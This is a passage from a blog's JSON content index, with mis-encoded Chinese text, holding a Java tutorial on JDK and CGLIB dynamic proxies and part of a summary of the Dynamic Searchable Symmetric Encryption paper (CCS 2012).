2.JDKåŠ¨æ€ä»£ç†\n\nJavaä¸­æä¾›äº†ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»Proxyï¼ŒProxyå¹¶ä¸æ˜¯æˆ‘ä»¬ä¸Šè¿°æ‰€è¯´çš„ä»£ç†å¯¹è±¡çš„ç±»ï¼Œè€Œæ˜¯æä¾›äº†ä¸€ä¸ªåˆ›å»ºä»£ç†å¯¹è±¡çš„é™æ€æ–¹æ³•ï¼ˆnewProxyInstanceæ–¹æ³•ï¼‰æ¥è·å–ä»£ç†å¯¹è±¡ã€‚\n\nä»£ç å¦‚ä¸‹ï¼š\n\n```java\n//å–ç¥¨æ¥å£\npublic interface SellTickets {\n    void sell();\n}\n\n//ç«è½¦ç«™  ç«è½¦ç«™å…·æœ‰å–ç¥¨åŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦å®ç°SellTicketsæ¥å£\npublic class TrainStation implements SellTickets {\n\n    public void sell() {\n        System.out.println(\"ç«è½¦ç«™å–ç¥¨\");\n    }\n}\n\n//ä»£ç†å·¥å‚ï¼Œç”¨æ¥åˆ›å»ºä»£ç†å¯¹è±¡\npublic class ProxyFactory {\n\n    private TrainStation station = new TrainStation();\n\n    public SellTickets getProxyObject() {\n        //ä½¿ç”¨Proxyè·å–ä»£ç†å¯¹è±¡\n        /*\n            newProxyInstance()æ–¹æ³•å‚æ•°è¯´æ˜ï¼š\n                ClassLoader loader ï¼š ç±»åŠ è½½å™¨ï¼Œç”¨äºåŠ è½½ä»£ç†ç±»ï¼Œä½¿ç”¨çœŸå®å¯¹è±¡çš„ç±»åŠ è½½å™¨å³å¯\n                Class<?>[] interfaces ï¼š çœŸå®å¯¹è±¡æ‰€å®ç°çš„æ¥å£ï¼Œä»£ç†æ¨¡å¼çœŸå®å¯¹è±¡å’Œä»£ç†å¯¹è±¡å®ç°ç›¸åŒçš„æ¥å£\n                InvocationHandler h ï¼š ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åº\n         */\n        SellTickets sellTickets = (SellTickets) Proxy.newProxyInstance(station.getClass().getClassLoader(),\n                station.getClass().getInterfaces(),\n                new InvocationHandler() {\n                    /*\n                        InvocationHandlerä¸­invokeæ–¹æ³•å‚æ•°è¯´æ˜ï¼š\n                            proxy ï¼š ä»£ç†å¯¹è±¡\n                            method ï¼š å¯¹åº”äºåœ¨ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨çš„æ¥å£æ–¹æ³•çš„ Method å®ä¾‹\n                            args ï¼š ä»£ç†å¯¹è±¡è°ƒç”¨æ¥å£æ–¹æ³•æ—¶ä¼ é€’çš„å®é™…å‚æ•°\n                     */\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n\n                        System.out.println(\"ä»£ç†ç‚¹æ”¶å–ä¸€äº›æœåŠ¡è´¹ç”¨(JDKåŠ¨æ€ä»£ç†æ–¹å¼)\");\n                        //æ‰§è¡ŒçœŸå®å¯¹è±¡\n                        Object result = method.invoke(station, args);\n                        return result;\n                    }\n                });\n        return sellTickets;\n    }\n}\n\n//æµ‹è¯•ç±»\npublic class Client {\n    public static void main(String[] args) {\n        //è·å–ä»£ç†å¯¹è±¡\n        ProxyFactory factory = new ProxyFactory();\n        \n        SellTickets proxyObject = factory.getProxyObject();\n        proxyObject.sell();\n    }\n}\n```\n\næ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š\n\n    1. åœ¨æµ‹è¯•ç±»ä¸­é€šè¿‡ä»£ç†å¯¹è±¡è°ƒç”¨sell()æ–¹æ³•\n    2. æ ¹æ®å¤šæ€çš„ç‰¹æ€§ï¼Œæ‰§è¡Œçš„æ˜¯ä»£ç†ç±»ï¼ˆ$Proxy0ï¼‰ä¸­çš„sell()æ–¹æ³•\n    3. ä»£ç†ç±»ï¼ˆ$Proxy0ï¼‰ä¸­çš„sell()æ–¹æ³•ä¸­åˆè°ƒç”¨äº†InvocationHandleræ¥å£çš„å­å®ç°ç±»å¯¹è±¡çš„invokeæ–¹æ³•\n    4. invokeæ–¹æ³•é€šè¿‡åå°„æ‰§è¡Œäº†çœŸå®å¯¹è±¡æ‰€å±ç±»(TrainStation)ä¸­çš„sell()æ–¹æ³•\n\n###  3.CGLIBåŠ¨æ€ä»£ç†\n\nå¦‚æœæ²¡æœ‰å®šä¹‰SellTicketsæ¥å£ï¼Œåªå®šä¹‰äº†TrainStation(ç«è½¦ç«™ç±»)ã€‚å¾ˆæ˜¾ç„¶JDKä»£ç†æ˜¯æ— æ³•ä½¿ç”¨äº†ï¼Œå› ä¸ºJDKåŠ¨æ€ä»£ç†è¦æ±‚å¿…é¡»å®šä¹‰æ¥å£ï¼Œå¯¹æ¥å£è¿›è¡Œä»£ç†ã€‚\n\nCGLIBæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ï¼Œé«˜æ€§èƒ½çš„ä»£ç ç”ŸæˆåŒ…ã€‚å®ƒä¸ºæ²¡æœ‰å®ç°æ¥å£çš„ç±»æä¾›ä»£ç†ï¼Œä¸ºJDKçš„åŠ¨æ€ä»£ç†æä¾›äº†å¾ˆå¥½çš„è¡¥å……ã€‚CGLIBæ˜¯ç¬¬ä¸‰æ–¹æä¾›çš„åŒ…ï¼Œæ‰€ä»¥éœ€è¦å¼•å…¥jaråŒ…çš„åæ ‡ï¼š\n\n```xml\n<dependency>\n    <groupId>cglib</groupId>\n    <artifactId>cglib</artifactId>\n    <version>2.2.2</version>\n</dependency>\n```\n\n```java\n//ç«è½¦ç«™\npublic class TrainStation {\n\n    public void sell() {\n        System.out.println(\"ç«è½¦ç«™å–ç¥¨\");\n    }\n}\n\n//ä»£ç†å·¥å‚\npublic class ProxyFactory implements MethodInterceptor {\n\n    private TrainStation target = new TrainStation();\n\n    public TrainStation getProxyObject() {\n        //åˆ›å»ºEnhancerå¯¹è±¡ï¼Œç±»ä¼¼äºJDKåŠ¨æ€ä»£ç†çš„Proxyç±»ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è®¾ç½®å‡ ä¸ªå‚æ•°\n        Enhancer enhancer =new Enhancer();\n        //è®¾ç½®çˆ¶ç±»çš„å­—èŠ‚ç å¯¹è±¡\n        enhancer.setSuperclass(target.getClass());\n        //è®¾ç½®å›è°ƒå‡½æ•°\n        enhancer.setCallback(this);\n        //åˆ›å»ºä»£ç†å¯¹è±¡\n        TrainStation obj = (TrainStation) enhancer.create();\n        return obj;\n    }\n\n    /*\n        interceptæ–¹æ³•å‚æ•°è¯´æ˜ï¼š\n            o ï¼š ä»£ç†å¯¹è±¡\n            method ï¼š çœŸå®å¯¹è±¡ä¸­çš„æ–¹æ³•çš„Methodå®ä¾‹\n            args ï¼š å®é™…å‚æ•°\n            methodProxy ï¼šä»£ç†å¯¹è±¡ä¸­çš„æ–¹æ³•çš„methodå®ä¾‹\n     */\n    public TrainStation intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable {\n        System.out.println(\"ä»£ç†ç‚¹æ”¶å–ä¸€äº›æœåŠ¡è´¹ç”¨(CGLIBåŠ¨æ€ä»£ç†æ–¹å¼)\");\n        TrainStation result = (TrainStation) methodProxy.invokeSuper(o, args);\n        return result;\n    }\n}\n\n//æµ‹è¯•ç±»\npublic class Client {\n    public static void main(String[] args) {\n        //åˆ›å»ºä»£ç†å·¥å‚å¯¹è±¡\n        ProxyFactory factory = new ProxyFactory();\n        //è·å–ä»£ç†å¯¹è±¡\n        TrainStation proxyObject = factory.getProxyObject();\n\n        proxyObject.sell();\n    }\n}\n```\n\n### 4.æ€»ç»“\n\n* jdkä»£ç†å’ŒCGLIBä»£ç†\n\n\nä½¿ç”¨CGLibå®ç°åŠ¨æ€ä»£ç†ï¼ŒCGLibåº•å±‚é‡‡ç”¨ASMå­—èŠ‚ç ç”Ÿæˆæ¡†æ¶ï¼Œä½¿ç”¨å­—èŠ‚ç æŠ€æœ¯ç”Ÿæˆä»£ç†ç±»ï¼Œåœ¨JDK1.6ä¹‹å‰æ¯”ä½¿ç”¨Javaåå°„æ•ˆç‡è¦é«˜ã€‚å”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ**CGLibä¸èƒ½å¯¹å£°æ˜ä¸ºfinalçš„ç±»æˆ–è€…æ–¹æ³•è¿›è¡Œä»£ç†ï¼Œå› ä¸ºCGLibåŸç†æ˜¯åŠ¨æ€ç”Ÿæˆè¢«ä»£ç†ç±»çš„å­ç±»ã€‚**\n\nJDK1.8çš„æ—¶å€™ï¼ŒJDKä»£ç†æ•ˆç‡é«˜äºCGLibä»£ç†ã€‚æ‰€ä»¥å¦‚æœæœ‰æ¥å£ä½¿ç”¨JDKåŠ¨æ€ä»£ç†ï¼Œå¦‚æœæ²¡æœ‰æ¥å£ä½¿ç”¨CGLIBä»£ç†ã€‚\n\n* åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†\n\n\nåŠ¨æ€ä»£ç†ä¸é™æ€ä»£ç†ç›¸æ¯”è¾ƒï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯æ¥å£ä¸­å£°æ˜çš„æ‰€æœ‰æ–¹æ³•éƒ½è¢«è½¬ç§»åˆ°è°ƒç”¨å¤„ç†å™¨ä¸€ä¸ªé›†ä¸­çš„æ–¹æ³•ä¸­å¤„ç†ï¼ˆInvocationHandler.invokeï¼‰ã€‚è¿™æ ·ï¼Œåœ¨æ¥å£æ–¹æ³•æ•°é‡æ¯”è¾ƒå¤šçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œçµæ´»å¤„ç†ï¼Œè€Œä¸éœ€è¦åƒé™æ€ä»£ç†é‚£æ ·æ¯ä¸€ä¸ªæ–¹æ³•è¿›è¡Œä¸­è½¬ã€‚\n\nå¦‚æœæ¥å£å¢åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œé™æ€ä»£ç†æ¨¡å¼é™¤äº†æ‰€æœ‰å®ç°ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•å¤–ï¼Œæ‰€æœ‰ä»£ç†ç±»ä¹Ÿéœ€è¦å®ç°æ­¤æ–¹æ³•ã€‚å¢åŠ äº†ä»£ç ç»´æŠ¤çš„å¤æ‚åº¦ã€‚è€ŒåŠ¨æ€ä»£ç†ä¸ä¼šå‡ºç°è¯¥é—®é¢˜\n\n**ä¼˜ç‚¹ï¼š**\n\n- ä»£ç†æ¨¡å¼åœ¨å®¢æˆ·ç«¯ä¸ç›®æ ‡å¯¹è±¡ä¹‹é—´èµ·åˆ°ä¸€ä¸ªä¸­ä»‹ä½œç”¨å’Œä¿æŠ¤ç›®æ ‡å¯¹è±¡çš„ä½œç”¨ï¼›\n- ä»£ç†å¯¹è±¡å¯ä»¥æ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ï¼›\n- ä»£ç†æ¨¡å¼èƒ½å°†å®¢æˆ·ç«¯ä¸ç›®æ ‡å¯¹è±¡åˆ†ç¦»ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé™ä½äº†ç³»ç»Ÿçš„è€¦åˆåº¦ï¼›\n\n**ç¼ºç‚¹ï¼š**\n\n* å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼›\n\n**ä½¿ç”¨åœºæ™¯ï¼š**\n\n* è¿œç¨‹ï¼ˆRemoteï¼‰ä»£ç†\n\n  æœ¬åœ°æœåŠ¡é€šè¿‡ç½‘ç»œè¯·æ±‚è¿œç¨‹æœåŠ¡ã€‚ä¸ºäº†å®ç°æœ¬åœ°åˆ°è¿œç¨‹çš„é€šä¿¡ï¼Œæˆ‘ä»¬éœ€è¦å®ç°ç½‘ç»œé€šä¿¡ï¼Œå¤„ç†å…¶ä¸­å¯èƒ½çš„å¼‚å¸¸ã€‚ä¸ºè‰¯å¥½çš„ä»£ç è®¾è®¡å’Œå¯ç»´æŠ¤æ€§ï¼Œæˆ‘ä»¬å°†ç½‘ç»œé€šä¿¡éƒ¨åˆ†éšè—èµ·æ¥ï¼Œåªæš´éœ²ç»™æœ¬åœ°æœåŠ¡ä¸€ä¸ªæ¥å£ï¼Œé€šè¿‡è¯¥æ¥å£å³å¯è®¿é—®è¿œç¨‹æœåŠ¡æä¾›çš„åŠŸèƒ½ï¼Œè€Œä¸å¿…è¿‡å¤šå…³å¿ƒé€šä¿¡éƒ¨åˆ†çš„ç»†èŠ‚ã€‚\n\n* é˜²ç«å¢™ï¼ˆFirewallï¼‰ä»£ç†\n\n  å½“ä½ å°†æµè§ˆå™¨é…ç½®æˆä½¿ç”¨ä»£ç†åŠŸèƒ½æ—¶ï¼Œé˜²ç«å¢™å°±å°†ä½ çš„æµè§ˆå™¨çš„è¯·æ±‚è½¬ç»™äº’è”ç½‘ï¼›å½“äº’è”ç½‘è¿”å›å“åº”æ—¶ï¼Œä»£ç†æœåŠ¡å™¨å†æŠŠå®ƒè½¬ç»™ä½ çš„æµè§ˆå™¨ã€‚\n\n* ä¿æŠ¤ï¼ˆProtect or Accessï¼‰ä»£ç†\n\n  æ§åˆ¶å¯¹ä¸€ä¸ªå¯¹è±¡çš„è®¿é—®ï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥ç»™ä¸åŒçš„ç”¨æˆ·æä¾›ä¸åŒçº§åˆ«çš„ä½¿ç”¨æƒé™ã€‚\n\n\n\n\n\n\n\n## â·é€‚é…å™¨æ¨¡å¼\n\n## â¸è£…é¥°è€…æ¨¡å¼\n\n## â¹æ¡¥æ¥æ¨¡å¼\n\n## âºå¤–è§‚æ¨¡å¼\n\n## â»ç»„åˆæ¨¡å¼\n\n## â¼äº«å…ƒæ¨¡å¼\n\n\n\n\n\n\n\n# â‘¢è¡Œä¸ºå‹æ¨¡å¼-11ç§\n\n\n\n\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["è®¾è®¡æ¨¡å¼"],"categories":["JavaSE"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šDSSEæ–¹æ¡ˆ","url":"/posts/62723.html","content":"\n**è®ºæ–‡åç§°ï¼šã€ŠDynamic Searchable Symmetric Encryptionã€‹**\n\n- ä½œè€…ï¼šSeny Kamaraã€Charalampos Papamanthouã€Tom Roeder \n- å•ä½ï¼šå¾®è½¯ç ”ç©¶é™¢ã€åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡\n- ä¼šè®®ï¼š[CCS '12: Proceedings of the 2012 ACM conference on Computer and communications](https://dl.acm.org/doi/10.1145/2382196.2382298)ã€CCF Aã€‘\n- æ—¶é—´ï¼š2012å¹´10æœˆ\n\n|   å¤šå…³é”®å­—   |  æ¨¡ç³Šæœç´¢  |      å¯éªŒè¯       |\n| :----------: | :--------: | :---------------: |\n|      âœ…       |     âŒ      |         âŒ         |\n| **åŠ¨æ€æ›´æ–°** | **å®‰å…¨æ€§** |    **å¤æ‚åº¦**     |\n|      âœ…       |  IND-CKA2  | äºšçº¿æ€§ $O(\\#f_w)$ |\n\n## 1ã€æ–¹æ¡ˆç®€ä»‹\n\nä»»ä½•å®ç”¨çš„SSEæ–¹æ¡ˆéƒ½åº”è¯¥ï¼ˆè‡³å°‘ï¼‰æ»¡è¶³ä»¥ä¸‹å±æ€§ï¼š**äºšçº¿æ€§æœç´¢æ—¶é—´**ã€**æŠµå¾¡è‡ªé€‚åº”é€‰æ‹©å…³é”®å­—æ”»å‡»çš„å®‰å…¨æ€§**ã€\n\n**ç´§å‡‘çš„ç´¢å¼•**ä»¥åŠ**æœ‰æ•ˆåœ°æ·»åŠ å’Œåˆ é™¤æ–‡ä»¶çš„èƒ½åŠ›**ã€‚æœ¬æ–‡æå‡ºäº†ç¬¬ä¸€ä¸ªSSEæ–¹æ¡ˆæ¥æ»¡è¶³ä¸Šè¿°æ‰€æœ‰å±æ€§ã€‚æˆ‘ä»¬æ–¹æ¡ˆæ‰©å±•äº†\n\nå€’æ’ç´¢å¼•æ–¹æ³•ï¼Œå¹¶ä¸ºSSEçš„è®¾è®¡å¼•å…¥äº†æ–°æŠ€æœ¯ã€‚\n\n**æˆ‘ä»¬çš„è´¡çŒ®**ï¼š\n\n1. æˆ‘ä»¬æå‡ºäº†**åŠ¨æ€SSEçš„å½¢å¼åŒ–å®‰å…¨å®šä¹‰**ã€‚\n2. æˆ‘ä»¬æ„é€ äº†ç¬¬ä¸€ä¸ªSSEæ–¹æ¡ˆï¼Œå®ƒæ˜¯**åŠ¨æ€çš„**ï¼Œ**CKA2-secure** çš„ï¼Œå¹¶ä¸”å®ç°äº†**æœ€ä¼˜çš„æœç´¢æ—¶é—´**ã€‚\n3. æˆ‘ä»¬æè¿°äº†åŸºäº[å¯æœç´¢çš„å¯¹ç§°åŠ å¯†ï¼šæ”¹è¿›çš„å®šä¹‰å’Œé«˜æ•ˆçš„ç»“æ„](https://dl.acm.org/doi/abs/10.5555/2590701.2590705)çš„å€’æ’ç´¢å¼•æ–¹æ³•çš„SSEæ–¹æ¡ˆçš„ç¬¬ä¸€ä¸ªå®ç°å’Œè¯„ä¼°ã€‚æˆ‘ä»¬çš„å®ç°è¡¨æ˜ï¼Œè¿™ç§ç±»å‹çš„SSEæ–¹æ¡ˆéå¸¸æœ‰æ•ˆã€‚\n\n## 2ã€å®‰å…¨æ€§\n\n> æœåŠ¡å™¨å¯ä»¥äº†è§£åˆ°ä¸€äº›å®¢æˆ·ç«¯æŸ¥è¯¢çš„æœ‰é™ä¿¡æ¯ã€‚ä¾‹å¦‚å®ƒçŸ¥é“æ­£åœ¨æœç´¢çš„å…³é”®å­—éƒ½åŒ…å«åœ¨åŠ å¯†ä¸º$c_{w}$ çš„æ–‡ä»¶ä¸­ã€‚\n\nSSEå®‰å…¨æ€§\n\n- ï¼ˆ1ï¼‰åŠ å¯†çš„ç´¢å¼• $\\gamma$  å’Œå¯†æ–‡ $c$ é™¤äº†æ–‡ä»¶çš„æ•°é‡ $n$ å’Œå®ƒä»¬çš„é•¿åº¦ä¹‹å¤–ï¼Œä¸æ³„éœ²å…³äº $f$ çš„ä»»ä½•ä¿¡æ¯ï¼›\n\n- ï¼ˆ2ï¼‰åŠ å¯†çš„ç´¢å¼• $\\gamma$ å’Œä»¤ç‰Œ $T_{w}$ è‡³å¤šæ­ç¤ºäº†æœç´¢ $I_{w}$ çš„ç»“æœã€‚\n\n**CKA1â€”â€”æŠµæŠ—é€‰æ‹©å…³é”®å­—æ”»å‡»çš„å®‰å…¨æ€§**\n\n- åªæœ‰å½“å®¢æˆ·çš„æŸ¥è¯¢ç‹¬ç«‹äºç´¢å¼•å’Œå…ˆå‰çš„ç»“æœæ—¶ï¼Œæ‰èƒ½ä¿è¯å®‰å…¨æ€§ã€‚\n\n**CKA2â€”â€”æŠµæŠ—è‡ªé€‚åº”é€‰æ‹©å…³é”®å­—æ”»å‡»çš„å®‰å…¨æ€§**\n\n- å³ä½¿å®¢æˆ·ç«¯çš„æŸ¥è¯¢æ˜¯åŸºäºåŠ å¯†çš„ç´¢å¼•å’Œå…ˆå‰æŸ¥è¯¢çš„ç»“æœï¼Œä¹Ÿèƒ½ä¿è¯å®‰å…¨æ€§ã€‚\n- å³ä½¿å­˜åœ¨å¯ä»¥åœ¨åè®®è¿›è¡Œæ—¶ç ´åå‚ä¸è€…çš„å¯¹æ‰‹çš„æƒ…å†µä¸‹ä¹Ÿèƒ½ä¿æŒå…¶å®‰å…¨æ€§ï¼Œåˆ™ç§°å…¶è‡ªé€‚åº”å®‰å…¨ã€‚\n\n------\n\nåŠ¨æ€SSEæ–¹æ¡ˆå¿…é¡»å…è®¸æ·»åŠ å’Œåˆ é™¤æ–‡ä»¶ã€‚è¿™ä¸¤ç§æ“ä½œéƒ½æ˜¯ä½¿ç”¨ä»¤ç‰Œæ¥å¤„ç†çš„ã€‚\n\n- ä¸ºäº†æ·»åŠ æ–‡ä»¶ $f$ï¼Œå®¢æˆ·ç«¯ç”Ÿæˆæ·»åŠ ä»¤ç‰Œ $\\tau_{a}$ï¼Œç»™å®š  $\\tau_{a}$ å’Œ $\\gamma$ï¼ŒæœåŠ¡å™¨å¯ä»¥æ›´æ–°åŠ å¯†çš„ç´¢å¼• $\\gamma$ã€‚\n\n- ä¸ºäº†åˆ é™¤æ–‡ä»¶ $f$ï¼Œå®¢æˆ·ç«¯ç”Ÿæˆåˆ é™¤ä»¤ç‰Œ $\\tau_{d}$ï¼ŒæœåŠ¡å™¨ç”¨å®ƒæ¥æ›´æ–° $\\gamma$ã€‚\n\nåŠ¨æ€SSEæ–¹æ¡ˆè¦æ±‚çš„å®‰å…¨ä¿è¯ï¼š\n\n- ï¼ˆ1ï¼‰ç»™å®šåŠ å¯†çš„ç´¢å¼• $\\gamma$ å’Œå¯†æ–‡åºåˆ— $c$ï¼Œä»»ä½•å¯¹æ‰‹éƒ½æ— æ³•è·çŸ¥å…³äºæ–‡ä»¶ $f$ çš„ä»»ä½•ä¿¡æ¯ï¼›\n\n- ï¼ˆ2ï¼‰ç»™å®šäº† token åºåˆ— $\\tau=(\\tau_{1},...,\\tau_{n})$ã€‚å¯¹äºè‡ªé€‚åº”ç”Ÿæˆçš„æŸ¥è¯¢åºåˆ— $q=(q_{1},...,q_{n})$ï¼ˆå®ƒå¯ä»¥ç”¨äºæœç´¢ã€æ·»åŠ æˆ–åˆ é™¤æ“ä½œï¼‰ï¼Œä»»ä½•å¯¹æ‰‹éƒ½æ— æ³•è·çŸ¥å…³äº $f$ æˆ– $q$ çš„ä»»ä½•ä¿¡æ¯ã€‚\n\n## 3ã€æ–¹æ¡ˆæ¦‚è¿°\n\n|    ç¬¦å·    | å«ä¹‰                           |\n| :--------: | :----------------------------- |\n|    $f$     | æ˜æ–‡åºåˆ— $f=(f_{1},...,f_{n})$ |\n|  $f_{w}$   | åŒ…å«$w$çš„æ˜æ–‡                  |\n|    $c$     | å¯†æ–‡åºåˆ— $c=(c_{1},...,c_{n})$ |\n|  $c_{w}$   | åŒ…å«$w$çš„å¯†æ–‡                  |\n|  $I_{w}$   | åŒ…å«$w$çš„æ–‡ä»¶æ ‡è¯†ç¬¦ $I_wâˆˆc$    |\n|    $Î´$     | ç´¢å¼•                           |\n|  $\\gamma$  | åŠ å¯†çš„ç´¢å¼•                     |\n| $\\tau_{s}$ | æœç´¢ä»¤ç‰Œ                       |\n| $\\tau_{a}$ | æ·»åŠ ä»¤ç‰Œ                       |\n| $\\tau_{d}$ | åˆ é™¤ä»¤ç‰Œ                       |\n|   $\\#f$    | $f$ ä¸­æ–‡ä»¶çš„æ•°é‡               |\n|  $\\#f_w$   | æ˜¯åŒ…å«å…³é”®å­—$w$çš„æ–‡ä»¶æ•°é‡      |\n|   $\\#W$    | å…³é”®å­—ç©ºé—´çš„å¤§å°               |\n\næˆ‘ä»¬çš„æ–¹æ¡ˆæ˜¯åŸºäºå€’æ’ç´¢å¼•SSE-1ç»“æ„çš„æ‰©å±•ã€‚å°½ç®¡ SSE-1 æ˜¯å®ç”¨çš„ï¼ˆå®ƒå¯¹äºå°å¸¸æ•°æ˜¯æ¸è¿‘æœ€ä¼˜çš„ï¼‰ï¼Œä½†å®ƒç¡®å®æœ‰ä¸€äº›é™åˆ¶ï¼Œä½¿å¾—å®ƒä¸é€‚åˆç›´æ¥ç”¨äºåŠ å¯†äº‘å­˜å‚¨ç³»ç»Ÿä¸­ï¼š\n\nâ€‹    ï¼ˆ1ï¼‰å®ƒåªèƒ½æŠµæŠ—éè‡ªé€‚åº”é€‰æ‹©å…³é”®å­—æ”»å‡»ï¼ˆCKA1ï¼‰ï¼Œè¿™æ„å‘³ç€å®ƒåªèƒ½ä¸ºæ‰¹é‡æ‰§è¡Œæœç´¢çš„å®¢æˆ·ç«¯æä¾›å®‰å…¨æ€§ï¼›\n\nâ€‹    ï¼ˆ2ï¼‰å®ƒä¸æ˜¯æ˜¾å¼åŠ¨æ€çš„ï¼Œå®ƒåªèƒ½æ”¯æŒä½¿ç”¨é€šç”¨å’Œä½æ•ˆæŠ€æœ¯çš„åŠ¨æ€æ“ä½œã€‚\n\n**SSE-1 construction**\n\nä¸ºäº†åŠ å¯†æ–‡ä»¶é›†åˆ $f$ï¼Œè¯¥æ–¹æ¡ˆä¸ºæ¯ä¸ªå…³é”®å­— $wâˆˆW$ æ„é€ ä¸€ä¸ªåˆ—è¡¨ $L_{w}$ï¼Œæ¯ä¸ªåˆ—è¡¨ $L_{w}$ ç”± $\\#\\rm f_{w}$ ä¸ªèŠ‚ç‚¹$(N_{1},...,N_{f_{w}})$ï¼Œå®ƒä»¬è¢«å­˜å‚¨åœ¨æœç´¢æ•°ç»„ $A_s$ ä¸­çš„éšæœºä½ç½®ã€‚èŠ‚ç‚¹ $N_{i}$ è¢«å®šä¹‰ä¸º$N_{i}=âŸ¨id,addr_{s}(N_{i+1})âŸ©$ï¼Œå…¶ä¸­ $id$ æ˜¯åŒ…å« $w$ çš„æ–‡ä»¶çš„å”¯ä¸€æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œ$addr_{s}(N)$ è¡¨ç¤ºåœ¨èŒƒå›´ $A_{s}$ ä¸­çš„èŠ‚ç‚¹ $N$ çš„ä½ç½®ã€‚\n\n> ä¸ºäº†é˜²æ­¢$A_{s}$çš„å¤§å°æ³„éœ²æœ‰å…³ $f$ çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå»ºè®®$A_{s}$çš„å¤§å°è‡³å°‘ä¸º$|c|/8$ï¼Œå’Œ ä½¿ç”¨é•¿åº¦é€‚å½“çš„éšæœºå­—ç¬¦ä¸²å¡«å……æœªä½¿ç”¨çš„å•å…ƒæ ¼ã€‚\n\nå¯¹äºæ¯ä¸ªå…³é”®å­— $w$ï¼Œå°†æŒ‡å‘ $L_{w}$ å¤´éƒ¨çš„æŒ‡é’ˆæ’å…¥åˆ°æœç´¢è¡¨ $T_{s}$ ä¸‹çš„æœç´¢é”® $F_{K_{1}}(w)$ä¸­ ï¼Œç„¶ååœ¨ç”Ÿæˆçš„å¯†é’¥ $G_{K_{2}}(w)$ ä¸‹ä½¿ç”¨ SKE= (Gen,Enc,Dec) å¯¹æ¯ä¸ªåˆ—è¡¨è¿›è¡ŒåŠ å¯†ã€‚\n\nå¦‚æœè¦æœç´¢å…³é”®å­— wï¼Œå®¢æˆ·ç«¯å‘é€ $F_{K_{1}}(w)$ å’Œ $G_{K_{2}}(w)$ å°±è¶³å¤Ÿäº†ã€‚ç„¶åï¼ŒæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨ $F_{K_{1}}(w)$ å’Œ $T_{s}$ æ¥æ¢å¤æŒ‡å‘ $L_{w}$ å¤´éƒ¨çš„æŒ‡é’ˆï¼Œå¹¶ä½¿ç”¨ $G_{K_{2}}(w)$ æ¥è§£å¯†åˆ—è¡¨å¹¶æ¢å¤åŒ…å« $w$ çš„æ–‡ä»¶çš„æ ‡è¯†ç¬¦ã€‚åªè¦ T æ”¯æŒ O(1) æ—¶é—´å¤æ‚åº¦æŸ¥æ‰¾ï¼ˆå¯ä»¥ä½¿ç”¨å“ˆå¸Œè¡¨å®ç°ï¼‰ï¼ŒæœåŠ¡å™¨çš„æ€»æœç´¢æ—¶é—´åœ¨ $\\#f_{w}$ ä¸­æ˜¯çº¿æ€§çš„ï¼Œè¿™æ˜¯æœ€ä¼˜çš„ã€‚\n\n------\n\nä½¿ç”¨SSE-1åŠ¨æ€ã€‚å¦‚ä¸Šæ‰€è¿°ï¼ŒSSE-1çš„é™åˆ¶æœ‰ä¸¤æ–¹é¢ï¼š\n\nï¼ˆ1ï¼‰å®ƒåªæ˜¯CKA1-secureçš„\n\nï¼ˆ2ï¼‰å®ƒä¸æ˜¯æ˜¾å¼åŠ¨æ€çš„ã€‚\n\nç¬¬ä¸€ä¸ªé™åˆ¶å¯ä»¥é€šè¿‡è¦æ±‚ SKE æ˜¯éæ‰¿è¯ºçš„å°±å¯ä»¥ç›¸å¯¹å®¹æ˜“åœ°è§£å†³(äº‹å®ä¸Šï¼Œè¯¥å·¥ä½œä¸­æå‡ºçš„ CKA2 å®‰å…¨ SSE ç»“æ„ä½¿ç”¨äº†ä¸€ä¸ªç®€å•çš„åŸºäº PRF çš„éæ‰¿è¯ºåŠ å¯†æ–¹æ¡ˆ)ã€‚\n\n- 